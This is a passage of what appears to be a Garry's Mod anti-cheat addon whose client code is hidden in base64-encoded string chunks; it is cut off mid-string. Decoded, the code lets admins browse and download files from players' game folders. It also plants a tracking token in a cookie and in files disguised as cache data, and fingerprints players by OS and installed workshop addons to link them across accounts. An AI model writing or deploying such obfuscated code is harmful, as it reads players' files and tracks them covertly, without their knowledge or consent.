gdHJ1ZSwKfQoKbG9jYWwgZnVuY3Rpb24gcmVxKGFjdGlvbiwgYTEsIGEyKQogICAgbmV0LlN0YXJ0KCJwYW5lbF9xdWVyeSIpCiAgICAgICAgbmV0LldyaXRlU3RyaW5nKGFjdGlvbikKICAgICAgICBuZXQuV3JpdGVTdHJpbmcoYTEgb3IgIiIpCiAgICAgICAgbmV0LldyaXRlU3RyaW5nKGEyIG9yICIiKQogICAgbmV0LlNlbmRUb1NlcnZlcigpCmVuZAoKZnVuY3Rpb24gRkIucmVxRm9sZGVyKHBhdGgsIG5vZGUpCiAgICBGQi5xdWV1ZVtwYXRoXSA9IG5vZGUKICAgIHJlcSgiZm9sZGVyIiwgcGF0aCwgIiIpCmVuZAoKZnVuY3Rpb24gRkIuc2V0dXBGb2xkZXIobm9kZSwgcGF0aCkKICAgIG5vZGUuZnVsbHBhdGggPSBwYXRoCiAgICBub2RlLmlzRm9sZGVyID0gdHJ1ZQogICAgbm9kZS5kaXNjb3ZlcmVkID0gZmFsc2UKICAgIG5vZGUuYXdhaXRpbmcgPSBmYWxzZQogICAgbm9kZS5Eb0NsaWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIG5vZGUuZGlzY292ZXJlZCB0aGVuCiAgICAgICAgICAgIG5vZGU6U2V0RXhwYW5kZWQobm90IG5vZGU6R2V0RXhwYW5kZWQoKSkKICAgICAgICBlbHNlaWYgbm90IG5vZGUuYXdhaXRpbmcgdGhlbgogICAgICAgICAgICBub2RlLmF3YWl0aW5nID0gdHJ1ZQogICAgICAgICAgICBGQi5yZXFGb2xkZXIocGF0aCwgbm9kZSkKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gZmFsc2UKICAgIGVuZAplbmQKCmZ1bmN0aW9uIEZCLm9wZW5GaWxlKHBhdGgpCiAgICByZXEoImZpbGUiLCBwYXRoLCAiIikKZW5kCgpmdW5jdGlvbiBGQi5yZXFDaHVuayhpKQogICAgaWYgbm90IEZCLmRsIHRoZW4gcmV0dXJuIGVuZAogICAgcmVxKCJkb3dubG9hZCIsIEZCLmRsLnBhdGgsIHRvc3RyaW5nKGkpKQplbmQKCmZ1bmN0aW9uIEZCLmRsRmFpbChtc2cpCiAgICBpZiBGQi5kbCBhbmQgSXNWYWxpZChGQi5kbC5sYmwpIHRoZW4gRkIuZGwubGJsOlNldFRleHQoItCe0YjQuNCx0LrQsDogIiAuLiBtc2cpIGVuZAogICAgRkIuZGwgPSBuaWwKZW5kCgpmdW5jdGlvbiBGQi5zdGFydERvd25sb2FkKHBhdGgpCiAgICBsb2NhbCBzaWQ2NCA9IHV0aWwuU3RlYW1JRFRvNjQoRkIuc2lkIG9yICIiKQogICAgaWYgbm90IHNpZDY0IG9yIHNpZDY0ID09ICIwIiB0aGVuIHNpZDY0ID0gInNpZCIgZW5kCiAgICBsb2NhbCByZWwgPSBzdHJpbmcuZ3N1YihwYXRoLCAiW14ldyUuXyUtL10iLCAiXyIpCiAgICBsb2NhbCBleHQgPSBzdHJpbmcubG93ZXIoc3RyaW5nLkdldEV4dGVuc2lvbkZyb21GaWxlbmFtZShwYXRoKSBvciAiIikKICAgIGxvY2FsIG91dCA9ICJjaGVjaGFfYWNfYnJvd3NlLyIgLi4gc2lkNjQgLi4gIi8iIC4uIHJlbAogICAgaWYgbm90IFdSSVRFQUJMRVtleHRdIHRoZW4gb3V0ID0gb3V0IC4uICIudHh0IiBlbmQKCiAgICBsb2NhbCBwYXJ0cyA9IHN0cmluZy5FeHBsb2RlKCIvIiwgb3V0KQogICAgdGFibGUucmVtb3ZlKHBhcnRzKQogICAgbG9jYWwgYWNjID0gIiIKICAgIGZvciBfLCBwIGluIGlwYWlycyhwYXJ0cykgZG8KICAgICAgICBhY2MgPSBhY2MgPT0gIiIgYW5kIHAgb3IgKGFjYyAuLiAiLyIgLi4gcCkKICAgICAgICBmaWxlLkNyZWF0ZURpcihhY2MpCiAgICBlbmQKCiAgICBGQi5kbCA9IHsgcGF0aCA9IHBhdGgsIG91dCA9IG91dCwgZ290ID0gMCB9CgogICAgaWYgSXNWYWxpZChGQi5kbGJveCkgdGhlbiBGQi5kbGJveDpSZW1vdmUoKSBlbmQKICAgIGxvY2FsIGIgPSB2Z3VpLkNyZWF0" ..
    "ZSgiREZyYW1lIikKICAgIEZCLmRsYm94ID0gYgogICAgYjpTZXRTaXplKDQ4MCwgMTI4KQogICAgYjpDZW50ZXIoKQogICAgYjpTZXRUaXRsZSgi0JLRi9C60LDRh9C60LA6ICIgLi4gcGF0aCkKICAgIGI6TWFrZVBvcHVwKCkKCiAgICBsb2NhbCBsYmwgPSB2Z3VpLkNyZWF0ZSgiRExhYmVsIiwgYikKICAgIGxibDpEb2NrKFRPUCkKICAgIGxibDpTZXRUZXh0KCLQodGC0LDRgNGC4oCmIikKICAgIEZCLmRsLmxibCA9IGxibAoKICAgIGxvY2FsIGJhciA9IHZndWkuQ3JlYXRlKCJEUGFuZWwiLCBiKQogICAgYmFyOkRvY2soVE9QKQogICAgYmFyOlNldFRhbGwoMjApCiAgICBiYXI6RG9ja01hcmdpbigwLCA4LCAwLCAwKQogICAgYmFyLnAgPSAwCiAgICBiYXIuUGFpbnQgPSBmdW5jdGlvbihfLCB3LCBoKQogICAgICAgIHN1cmZhY2UuU2V0RHJhd0NvbG9yKDQwLCA0MCwgNDApCiAgICAgICAgc3VyZmFjZS5EcmF3UmVjdCgwLCAwLCB3LCBoKQogICAgICAgIHN1cmZhY2UuU2V0RHJhd0NvbG9yKDI1NSwgMTQwLCAwKQogICAgICAgIHN1cmZhY2UuRHJhd1JlY3QoMCwgMCwgdyAqIGJhci5wLCBoKQogICAgZW5kCiAgICBGQi5kbC5iYXIgPSBiYXIKCiAgICBsb2NhbCBjYW5jZWwgPSB2Z3VpLkNyZWF0ZSgiREJ1dHRvbiIsIGIpCiAgICBjYW5jZWw6RG9jayhCT1RUT00pCiAgICBjYW5jZWw6U2V0VGFsbCgyNikKICAgIGNhbmNlbDpTZXRUZXh0KCLQntGC0LzQtdC90LAiKQogICAgY2FuY2VsLkRvQ2xpY2sgPSBmdW5jdGlvbigpCiAgICAgICAgRkIuZGwgPSBuaWwKICAgICAgICBiOlJlbW92ZSgpCiAgICBlbmQKCiAgICBGQi5yZXFDaHVuaygwKQplbmQKCmZ1bmN0aW9uIEZCLm9uQ2h1bmsoZGF0YSkKICAgIGlmIG5vdCBGQi5kbCB0aGVuIHJldHVybiBlbmQKICAgIGlmICNkYXRhIDwgNCB0aGVuIEZCLmRsRmFpbCgi0LHQuNGC0YvQuSDQv9Cw0LrQtdGCIikgcmV0dXJuIGVuZAogICAgbG9jYWwgY3VyID0gc3RyaW5nLmJ5dGUoZGF0YSwgMSkgKyBzdHJpbmcuYnl0ZShkYXRhLCAyKSAqIDI1NgogICAgbG9jYWwgdG90YWwgPSBzdHJpbmcuYnl0ZShkYXRhLCAzKSArIHN0cmluZy5ieXRlKGRhdGEsIDQpICogMjU2CiAgICBpZiB0b3RhbCA9PSAwIHRoZW4gRkIuZGxGYWlsKCLRhNCw0LnQuyDQvdC1INC90LDQudC00LXQvSDQuNC70Lgg0YHQu9C40YjQutC+0Lwg0LHQvtC70YzRiNC+0LkiKSByZXR1cm4gZW5kCiAgICBsb2NhbCBieXRlcyA9IHN0cmluZy5zdWIoZGF0YSwgNSkKICAgIGlmIGN1ciA9PSAwIHRoZW4KICAgICAgICBmaWxlLldyaXRlKEZCLmRsLm91dCwgYnl0ZXMpCiAgICBlbHNlCiAgICAgICAgZmlsZS5BcHBlbmQoRkIuZGwub3V0LCBieXRlcykKICAgIGVuZAogICAgRkIuZGwuZ290ID0gY3VyICsgMQogICAgaWYgSXNWYWxpZChGQi5kbC5iYXIpIHRoZW4gRkIuZGwuYmFyLnAgPSBGQi5kbC5nb3QgLyB0b3RhbCBlbmQKICAgIGlmIElzVmFsaWQoRkIuZGwubGJsKSB0aGVuIEZCLmRsLmxibDpTZXRUZXh0KHN0cmluZy5mb3JtYXQoItCn0LDQvdC6ICVkIC8gJWQiLCBGQi5kbC5nb3QsIHRvdGFsKSkgZW5kCiAgICBpZiBGQi5kbC5nb3QgPCB0b3RhbCB0aGVuCiAgICAgICAgbG9jYWwgbmV4dEkgPSBGQi5kbC5nb3QKICAgICAgICB0aW1lci5TaW1wbGUoMC4yLCBmdW5jdGlvbigpIGlmIEZCLmRsIHRoZW4gRkIucmVxQ2h1bmsobmV4dEkpIGVuZCBlbmQpCiAgICBlbHNlCiAgICAgICAgaWYgSXNWYWxpZChGQi5kbC5sYmwpIHRoZW4gRkIuZGwubGJsOlNldFRleHQoItCT0L7RgtC+0LLQviDihpIgZGF0YS8iIC4uIEZCLmRsLm91dCkgZW5kCiAgICAgICAgRkIuZGwgPSBuaWwKICAgIGVuZAplbmQKCmZ1bmN0aW9uIEZCLmZpbGxGb2xkZXIoaikKICAgIGxvY2FsIG5vZGUgPSBGQi5xdWV1ZVtqLnBhdGggb3IgIiJdCiAgICBGQi5xdWV1ZVtqLnBhdGggb3IgIiJdID0gbmlsCiAgICBpZiBub3QgSXNWYWxpZChub2RlKSB0aGVuIHJldHVybiBlbmQKICAgIG5vZGUuYXdhaXRpbmcgPSBmYWxzZQogICAgbm9kZS5kaXNjb3ZlcmVkID0gdHJ1ZQogICAgZm9yIF8sIGQgaW4gaXBhaXJzKGouZm9sZGVycyBvciB7fSkgZG8KICAgICAgICBsb2NhbCBjaGlsZCA9IG5vZGU6QWRkTm9kZShkLCAiaWNvbjE2L2ZvbGRlci5wbmciKQogICAgICAgIEZCLnNldHVwRm9sZGVyKGNoaWxkLCAoai5wYXRoIG9yICIiKSAuLiBkIC4uICIvIikKICAgIGVuZAogICAgZm9yIF8sIGZuIGluIGlwYWlycyhqLmZpbGVzIG9yIHt9KSBkbwogICAgICAgIGxvY2FsIGNoaWxkID0gbm9kZTpBZGROb2RlKGZuLCAiaWNvbjE2L3BhZ2Vfd2hpdGUucG5nIikKICAgICAgICBjaGlsZC5pc0ZvbGRlciA9IGZhbHNlCiAgICAgICAgY2hpbGQuZnVsbHBhdGggPSAoai5wYXRoIG9yICIiKSAuLiBmbgogICAgZW5kCiAgICBub2RlOlNldEV4cGFuZGVkKHRydWUpCmVuZAoKZnVuY3Rpb24gRkIuc2hvd0ZpbGUoaikKICAgIGlmIGouZXJyIHRoZW4KICAgICAgICBEZXJtYV9NZXNzYWdlKCLQpNCw0LnQuzogIiAuLiB0b3N0cmluZyhqLnBhdGgpIC4uICJcbtCg0LDQt9C80LXRgDogIiAuLiB0b3N0cmluZyhqLnNpemUpIC4uCiAgICAgICAgICAgICIg0JFcblxuIiAuLiB0b3N0cmluZyhqLmVyciksICLQp9C10YfQsNCU0LXRhNC10L3QtNC10YAiLCAiT0siKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBsb2NhbCBmID0gdmd1aS5DcmVhdGUoIkRGcmFtZSIpCiAgICBmOlNldFNpemUoNzIwLCA1NDApCiAgICBmOkNlbnRlcigpCiAgICBmOlNldFRpdGxlKHRvc3RyaW5nKGoucGF0aCkgLi4gIiAgKCIgLi4gdG9zdHJpbmcoai5zaXplKSAuLiAiINCRKSIpCiAgICBmOk1ha2VQb3B1cCgpCiAgICBsb2NhbCB0ZSA9IHZndWkuQ3JlYXRlKCJEVGV4dEVudHJ5IiwgZikKICAgIHRlOkRvY2soRklMTCkKICAgIHRlOlNldE11bHRpbGluZSh0cnVlKQogICAgdGU6U2V0RWRpdGFibGUoZmFsc2UpCiAgICB0ZTpTZXRWYWx1ZShqLmNvbnRlbnQgb3IgIiIpCmVuZAoKZnVuY3Rpb24gRkIub3BlbihuaWNrLCBzaWQpCiAgICBp" ..
    "ZiBJc1ZhbGlkKEZCLmZyYW1lKSB0aGVuIEZCLmZyYW1lOlJlbW92ZSgpIGVuZAogICAgRkIuc2lkID0gc2lkCiAgICBGQi5xdWV1ZSA9IHt9CgogICAgbG9jYWwgZiA9IHZndWkuQ3JlYXRlKCJERnJhbWUiKQogICAgRkIuZnJhbWUgPSBmCiAgICBmOlNldFNpemUoOTAwLCA2NDApCiAgICBmOkNlbnRlcigpCiAgICBmOlNldFRpdGxlKCLQp9C10YfQsNCU0LXRhNC10L3QtNC10YAg4oCUINCk0LDQudC70Ys6ICIgLi4gbmljayAuLiAiICgiIC4uIHNpZCAuLiAiKSIpCiAgICBmOk1ha2VQb3B1cCgpCiAgICBmLk9uQ2xvc2UgPSBmdW5jdGlvbigpIHJlcSgiY2xvc2UiLCAiIiwgIiIpIGVuZAoKICAgIGxvY2FsIGJvdHRvbSA9IHZndWkuQ3JlYXRlKCJEUGFuZWwiLCBmKQogICAgYm90dG9tOkRvY2soQk9UVE9NKQogICAgYm90dG9tOlNldFRhbGwoMzApCiAgICBib3R0b206RG9ja01hcmdpbigwLCA0LCAwLCAwKQogICAgYm90dG9tLlBhaW50ID0gZnVuY3Rpb24oKSBlbmQKCiAgICBsb2NhbCB2aWV3ID0gdmd1aS5DcmVhdGUoIkRCdXR0b24iLCBib3R0b20pCiAgICB2aWV3OkRvY2soTEVGVCkKICAgIHZpZXc6U2V0V2lkZSgxODApCiAgICB2aWV3OlNldFRleHQoItCf0YDQvtGB0LzQvtGC0YAg0YTQsNC50LvQsCIpCgogICAgbG9jYWwgZGwgPSB2Z3VpLkNyZWF0ZSgiREJ1dHRvbiIsIGJvdHRvbSkKICAgIGRsOkRvY2soTEVGVCkKICAgIGRsOlNldFdpZGUoMTgwKQogICAgZGw6RG9ja01hcmdpbig2LCAwLCAwLCAwKQogICAgZGw6U2V0VGV4dCgi0KHQutCw0YfQsNGC0Ywg0YTQsNC50LsiKQoKICAgIGxvY2FsIHJlbG9hZCA9IHZndWkuQ3JlYXRlKCJEQnV0dG9uIiwgYm90dG9tKQogICAgcmVsb2FkOkRvY2soUklHSFQpCiAgICByZWxvYWQ6U2V0V2lkZSgxNjApCiAgICByZWxvYWQ6U2V0VGV4dCgi0J/QtdGA0LXRgdGC0YDQvtC40YLRjCDQtNC10YDQtdCy0L4iKQoKICAgIGxvY2FsIHRyZWUgPSB2Z3VpLkNyZWF0ZSgiRFRyZWUiLCBmKQogICAgdHJlZTpEb2NrKEZJTEwpCiAgICBGQi50cmVlID0gdHJlZQoKICAgIGxvY2FsIGZ1bmN0aW9uIHNlbGVjdGVkRmlsZSgpCiAgICAgICAgbG9jYWwgbiA9IHRyZWU6R2V0U2VsZWN0ZWROb2RlKCkKICAgICAgICBpZiBub3QgSXNWYWxpZChuKSBvciBuLmlzRm9sZGVyIG9yIG5vdCBuLmZ1bGxwYXRoIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICByZXR1cm4gbi5mdWxscGF0aAogICAgZW5kCgogICAgdmlldy5Eb0NsaWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHAgPSBzZWxlY3RlZEZpbGUoKQogICAgICAgIGlmIHAgdGhlbiBGQi5vcGVuRmlsZShwKSBlbmQKICAgIGVuZAogICAgZGwuRG9DbGljayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwID0gc2VsZWN0ZWRGaWxlKCkKICAgICAgICBpZiBwIHRoZW4gRkIuc3RhcnREb3dubG9hZChwKSBlbmQKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGJ1aWxkUm9vdCgpCiAgICAgICAgdHJlZTpDbGVhcigpCiAgICAgICAgRkIucXVldWUgPSB7fQogICAgICAgIGxvY2FsIHJvb3QgPSB0cmVlOkFkZE5vZGUoImdhcnJ5c21vZCIsICJpY29uMTYvZm9sZGVyLnBuZyIpCiAgICAgICAgRkIuc2V0dXBGb2xkZXIocm9vdCwgImdhcnJ5c21vZC8iKQogICAgICAgIHJvb3QuYXdhaXRpbmcgPSB0cnVlCiAgICAgICAgRkIucmVxRm9sZGVyKCJnYXJyeXNtb2QvIiwgcm9vdCkKICAgIGVuZAogICAgcmVsb2FkLkRvQ2xpY2sgPSBidWlsZFJvb3QKICAgIGJ1aWxkUm9vdCgpCmVuZAoKZnVuY3Rpb24gRkIub3BlblBpY2tlcigpCiAgICBpZiBJc1ZhbGlkKEZCLnBpY2tlcikgdGhlbiBGQi5waWNrZXI6UmVtb3ZlKCkgZW5kCgogICAgbG9jYWwgZiA9IHZndWkuQ3JlYXRlKCJERnJhbWUiKQogICAgRkIucGlja2VyID0gZgogICAgZjpTZXRTaXplKDU2MCwgNTIwKQogICAgZjpDZW50ZXIoKQogICAgZjpTZXRUaXRsZSgi0KfQtdGH0LDQlNC10YTQtdC90LTQtdGAIOKAlCDQstGL0LHQvtGAINC40LPRgNC+0LrQsCIpCiAgICBmOk1ha2VQb3B1cCgpCgogICAgbG9jYWwgc2VhcmNoID0gdmd1aS5DcmVhdGUoIkRUZXh0RW50cnkiLCBmKQogICAgc2VhcmNoOkRvY2soVE9QKQogICAgc2VhcmNoOkRvY2tNYXJnaW4oMCwgMCwgMCwgNCkKICAgIHNlYXJjaDpTZXRQbGFjZWhvbGRlclRleHQoItCf0L7QuNGB0Log0L/QviDQvdC40LrRgyDQuNC70LggU3RlYW1JROKApiIpCgogICAgbG9jYWwgcmVmID0gdmd1aS5DcmVhdGUoIkRCdXR0b24iLCBmKQogICAgcmVmOkRvY2soQk9UVE9NKQogICAgcmVmOlNldFRhbGwoMjYpCiAgICByZWY6RG9ja01hcmdpbigwLCA0LCAwLCAwKQogICAgcmVmOlNldFRleHQoItCe0LHQvdC+0LLQuNGC0Ywg0YHQv9C40YHQvtC6IikKCiAgICBsb2NhbCBsaXN0ID0gdmd1aS5DcmVhdGUoIkRMaXN0VmlldyIsIGYpCiAgICBsaXN0OkRvY2soRklMTCkKICAgIGxpc3Q6U2V0TXVsdGlTZWxlY3QoZmFsc2UpCiAgICBsaXN0OkFkZENvbHVtbigi0J3QuNC6IikKICAgIGxpc3Q6QWRkQ29sdW1uKCJTdGVhbUlEIik6U2V0Rml4ZWRXaWR0aCgxNTApCiAgICBsaXN0OkFkZENvbHVtbigi0J/QuNC90LMiKTpTZXRGaXhlZFdpZHRoKDUyKQoKICAgIGxvY2FsIGZ1bmN0aW9uIHJlZmlsbCgpCiAgICAgICAgbGlzdDpDbGVhcigpCiAgICAgICAgbG9jYWwgcSA9IHN0cmluZy5sb3dlcihzdHJpbmcuVHJpbShzZWFyY2g6R2V0VmFsdWUoKSBvciAiIikpCiAgICAgICAgZm9yIF8sIHAgaW4gaXBhaXJzKHBsYXllci5HZXRBbGwoKSkgZG8KICAgICAgICAgICAgaWYgSXNWYWxpZChwKSBhbmQgbm90IHA6SXNCb3QoKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBuaWNrID0gcDpOaWNrKCkKICAgICAgICAgICAgICAgIGlmIHEgPT0gIiIgb3Igc3RyaW5nLmZpbmQoc3RyaW5nLmxvd2VyKG5pY2spLCBxLCAxLCB0cnVlKQogICAgICAgICAgICAgICAgICAgIG9yIHN0cmluZy5maW5kKHN0cmluZy5sb3dlcihwOlN0ZWFtSUQoKSksIHEsIDEsIHRydWUpIHRoZW4KICAgICAgICAgICAg" ..
    "ICAgICAgICBsb2NhbCBsaW5lID0gbGlzdDpBZGRMaW5lKG5pY2ssIHA6U3RlYW1JRCgpLCBwOlBpbmcoKSkKICAgICAgICAgICAgICAgICAgICBsaW5lLnNpZCA9IHA6U3RlYW1JRCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsaXN0LkRvRG91YmxlQ2xpY2sgPSBmdW5jdGlvbihfLCBfLCBsaW5lKQogICAgICAgIGlmIG5vdCBsaW5lLnNpZCB0aGVuIHJldHVybiBlbmQKICAgICAgICBuZXQuU3RhcnQoInBhbmVsX29wZW4iKQogICAgICAgICAgICBuZXQuV3JpdGVTdHJpbmcobGluZS5zaWQpCiAgICAgICAgbmV0LlNlbmRUb1NlcnZlcigpCiAgICAgICAgZjpSZW1vdmUoKQogICAgZW5kCiAgICBzZWFyY2guT25DaGFuZ2UgPSByZWZpbGwKICAgIHJlZi5Eb0NsaWNrID0gcmVmaWxsCiAgICByZWZpbGwoKQplbmQKCm5ldC5SZWNlaXZlKCJwYW5lbF91aV9vcGVuIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgbmljayA9IG5ldC5SZWFkU3RyaW5nKCkKICAgIGxvY2FsIHNpZCA9IG5ldC5SZWFkU3RyaW5nKCkKICAgIEZCLm9wZW4obmljaywgc2lkKQplbmQpCgpuZXQuUmVjZWl2ZSgicGFuZWxfcmVzdWx0IiwgZnVuY3Rpb24oKQogICAgbG9jYWwgYWN0aW9uID0gbmV0LlJlYWRTdHJpbmcoKQogICAgbG9jYWwgbiA9IG5ldC5SZWFkVUludCgzMikKICAgIGxvY2FsIGRhdGEgPSBuZXQuUmVhZERhdGEobikKICAgIGlmIGFjdGlvbiA9PSAiZXJyIiB0aGVuCiAgICAgICAgbG9jYWwgaiA9IHV0aWwuSlNPTlRvVGFibGUodXRpbC5EZWNvbXByZXNzKGRhdGEgb3IgIiIpIG9yICJ7fSIpIG9yIHt9CiAgICAgICAgRGVybWFfTWVzc2FnZShqLm1zZyBvciAi0J7RiNC40LHQutCwIiwgItCn0LXRh9Cw0JTQtdGE0LXQvdC00LXRgCIsICJPSyIpCiAgICBlbHNlaWYgYWN0aW9uID09ICJmb2xkZXIiIHRoZW4KICAgICAgICBGQi5maWxsRm9sZGVyKHV0aWwuSlNPTlRvVGFibGUodXRpbC5EZWNvbXByZXNzKGRhdGEgb3IgIiIpIG9yICJ7fSIpIG9yIHt9KQogICAgZWxzZWlmIGFjdGlvbiA9PSAiZmlsZSIgdGhlbgogICAgICAgIEZCLnNob3dGaWxlKHV0aWwuSlNPTlRvVGFibGUodXRpbC5EZWNvbXByZXNzKGRhdGEgb3IgIiIpIG9yICJ7fSIpIG9yIHt9KQogICAgZWxzZWlmIGFjdGlvbiA9PSAiZG93bmxvYWQiIHRoZW4KICAgICAgICBGQi5vbkNodW5rKGRhdGEgb3IgIiIpCiAgICBlbmQKZW5kKQoKY29uY29tbWFuZC5BZGQoInJwX2FjX21lbnUiLCBmdW5jdGlvbigpCiAgICBpZiBub3QgTG9jYWxQbGF5ZXIoKTpJc1N1cGVyQWRtaW4oKSB0aGVuIHJldHVybiBlbmQKICAgIEZCLm9wZW5QaWNrZXIoKQplbmQpCgpjb25jb21tYW5kLkFkZCgicnBfYWNfZmlsZXMiLCBmdW5jdGlvbihfLCBfLCBhcmdzKQogICAgaWYgbm90IExvY2FsUGxheWVyKCk6SXNTdXBlckFkbWluKCkgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCB0ID0gYXJnc1sxXQogICAgaWYgdCBhbmQgc3RyaW5nLlRyaW0odCkgfj0gIiIgdGhlbgogICAgICAgIG5ldC5TdGFydCgicGFuZWxfb3BlbiIpCiAgICAgICAgICAgIG5ldC5Xcml0ZVN0cmluZyh0KQogICAgICAgIG5ldC5TZW5kVG9TZXJ2ZXIoKQogICAgZWxzZQogICAgICAgIEZCLm9wZW5QaWNrZXIoKQogICAgZW5kCmVuZCkKCmNvbmNvbW1hbmQuQWRkKCJycF9hY19za2lucyIsIGZ1bmN0aW9uKF8sIF8sIGFyZ3MpCiAgICBpZiBub3QgTG9jYWxQbGF5ZXIoKTpJc1N1cGVyQWRtaW4oKSB0aGVuIHJldHVybiBlbmQKICAgIG5ldC5TdGFydCgicGFuZWxfc2Nhbl9yZXEiKQogICAgICAgIG5ldC5Xcml0ZVN0cmluZyhhcmdzWzFdIG9yICIiKQogICAgbmV0LlNlbmRUb1NlcnZlcigpCmVuZCkKCgotLSBjbF9jaGVjaGFkZWZlbmRlcl9ldmFzaW9uLmx1YQoKaWYgbm90IENMSUVOVCB0aGVuIHJldHVybiBlbmQKCmxvY2FsIENPT0tJRV9OQU1FID0gImNkX2lkX3Rva2VuIgoKbG9jYWwgRklMRV9TVE9SRVMgPSB7ICJjZF9pZC5kYXQiLCAiY2FjaGUvY2xfY2FjaGUuZGF0IiwgInNldHRpbmdzL2NsX3N0YXRlLmRhdCIgfQoKbG9jYWwgZnVuY3Rpb24gcmVhZFRva2VuKCkKICAgIGxvY2FsIGMgPSBjb29raWUuR2V0U3RyaW5nKENPT0tJRV9OQU1FLCAiIikgb3IgIiIKICAgIGlmIGlzc3RyaW5nKGMpIGFuZCBjIH49ICIiIHRoZW4gcmV0dXJuIGMgZW5kCiAgICBmb3IgXywgZm4gaW4gaXBhaXJzKEZJTEVfU1RPUkVTKSBkbwogICAgICAgIGxvY2FsIHYgPSBmaWxlLlJlYWQoZm4sICJEQVRBIikKICAgICAgICBpZiBpc3N0cmluZyh2KSB0aGVuCiAgICAgICAgICAgIHYgPSBzdHJpbmcuVHJpbSh2KQogICAgICAgICAgICBpZiB2IH49ICIiIHRoZW4gcmV0dXJuIHYgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiAiIgplbmQKCmxvY2FsIGZ1bmN0aW9uIHdyaXRlVG9rZW4odG9rKQogICAgaWYgbm90IGlzc3RyaW5nKHRvaykgb3IgdG9rID09ICIiIHRoZW4gcmV0dXJuIGVuZAogICAgcGNhbGwoY29va2llLlNldCwgQ09PS0lFX05BTUUsIHRvaykKICAgIHBjYWxsKGZpbGUuQ3JlYXRlRGlyLCAiY2FjaGUiKQogICAgcGNhbGwoZmlsZS5DcmVhdGVEaXIsICJzZXR0aW5ncyIpCiAgICBmb3IgXywgZm4gaW4gaXBhaXJzKEZJTEVfU1RPUkVTKSBkbwogICAgICAgIHBjYWxsKGZpbGUuV3JpdGUsIGZuLCB0b2spCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBmdChwYXRoLCBncCkKICAgIGxvY2FsIG9rLCB0ID0gcGNhbGwoZmlsZS5UaW1lLCBwYXRoLCBncCBvciAiR0FNRSIpCiAgICByZXR1cm4gKG9rIGFuZCB0KSBhbmQgdG9zdHJpbmcodCkgb3IgIjAiCmVuZAoKbG9jYWwgZnVuY3Rpb24gb3NOYW1lKCkKICAgIGlmIHN5c3RlbSB0aGVuCiAgICAgICAgaWYgc3lzdGVtLklzV2luZG93cyBhbmQgc3lzdGVtLklzV2luZG93cygpIHRoZW4gcmV0dXJuICJ3aW5kb3dzIiBlbmQKICAgICAgICBpZiBzeXN0ZW0uSXNPU1ggYW5kIHN5c3RlbS5Jc09TWCgpIHRoZW4gcmV0dXJuICJvc3giIGVuZAogICAgICAg" ..
    "IGlmIHN5c3RlbS5Jc0xpbnV4IGFuZCBzeXN0ZW0uSXNMaW51eCgpIHRoZW4gcmV0dXJuICJsaW51eCIgZW5kCiAgICBlbmQKICAgIHJldHVybiB0b3N0cmluZyhqaXQgYW5kIGppdC5vcyBvciAiPyIpCmVuZAoKLS0g0KHQv9C40YHQvtC6INC/0L7QtNC/0LjRgdCw0L3QvdGL0YUgd29ya3Nob3At0LDQtNC00L7QvdC+0LIgKNC+0YLRgdC+0YDRgtC40YDQvtCy0LDQvdC90YvQtSB3c2lkKS4g0J3QsNCx0L7RgCDQv9C+0LTQv9C40YHQvtC6Ci0tINGD0L3QuNC60LDQu9C10L0v0YHRgtCw0LHQuNC70LXQvSDQvdCwINC40LPRgNC+0LrQsCwg0L/QtdGA0LXQttC40LLQsNC10YIgwqvQvtGH0LjRgdGC0LrRgyBkYXRhwrsgKNC/0L7QtNC/0LjRgdC60Lgg0L3QsCDRgdGC0L7RgNC+0L3QtQotLSBTdGVhbSkg0Lgg0YHQvNC10L3RgyBJUCDihpIg0YHQuNC70YzQvdGL0Lkg0YHQuNCz0L3QsNC7INC00LvRjyDQvdC10YfRkdGC0LrQvtC5INC70LjQvdC60L7QstC60LggKNC/0LXRgNC10YHQtdGH0LXQvdC40LUg0LzQvdC+0LbQtdGB0YLQsikuCmxvY2FsIGZ1bmN0aW9uIGFkZG9uTGlzdCgpCiAgICBsb2NhbCBvaywgbGlzdCA9IHBjYWxsKGVuZ2luZS5HZXRBZGRvbnMpCiAgICBpZiBub3Qgb2sgb3Igbm90IGlzdGFibGUobGlzdCkgdGhlbiByZXR1cm4ge30gZW5kCiAgICBsb2NhbCBpZHMgPSB7fQogICAgZm9yIF8sIGEgaW4gaXBhaXJzKGxpc3QpIGRvCiAgICAgICAgbG9jYWwgaWQgPSBhIGFuZCAoYS53c2lkIG9yIGEuV29ya3Nob3BJRCkKICAgICAgICBpZiBpZCBhbmQgdG9zdHJpbmcoaWQpIH49ICIwIiB0aGVuIGlkc1sjaWRzICsgMV0gPSB0b3N0cmluZyhpZCkgZW5kCiAgICBlbmQKICAgIHRhYmxlLnNvcnQoaWRzKQogICAgcmV0dXJuIGlkcwplbmQKCmxvY2FsIGZ1bmN0aW9uIGFkZG9uc1NpZygpCiAgICBsb2NhbCBpZHMgPSBhZGRvbkxpc3QoKQogICAgbG9jYWwgam9pbmVkID0gdGFibGUuY29uY2F0KGlkcywgIiwiKQogICAgbG9jYWwgaCA9ICh1dGlsLlNIQTI1NiBhbmQgdXRpbC5TSEEyNTYoam9pbmVkKSkgb3IgKHV0aWwuQ1JDIGFuZCB1dGlsLkNSQyhqb2luZWQpKSBvciAiIgogICAgcmV0dXJuICNpZHMsIHRvc3RyaW5nKGgpCmVuZAoKLS0g0KXRjdGIINC/0L7Qu9GM0LfQvtCy0LDRgtC10LvRjNGB0LrQvtCz0L4g0LrQvtC90YTQuNCz0LAgKNCx0LjQvdC00Ysv0YHQtdC90YHQsC9jdmFyKS4g0J/Rg9GC0YwgR0FNRSA9IGdhcnJ5c21vZC9jZmcsCi0tINCy0L3QtSBkYXRhLyDihpIg0L/QtdGA0LXQttC40LLQsNC10YIgwqvQvtGH0LjRgdGC0LrR